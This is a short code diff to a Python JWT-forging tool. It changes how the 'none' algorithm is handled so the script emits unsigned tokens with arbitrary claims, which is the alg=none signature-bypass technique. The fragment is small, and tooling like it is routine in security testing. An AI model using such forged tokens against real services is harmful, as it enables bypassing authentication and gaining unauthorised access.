@@ -60,7 +60,9 @@ def main():
     claims, key = parse_claims_and_key(" ".join(sys.argv[2:]))
 
     key = None if alg.upper() == "NONE" else key
-    alg = None if alg.upper() == "NONE" else alg
+    if alg.upper() == "NONE":
+        key = None
+        alg = "none"
 
     forged_jwt = jwt.encode(claims, key, algorithm=alg)
     print(f"[!] Forged JWT: {forged_jwt}")
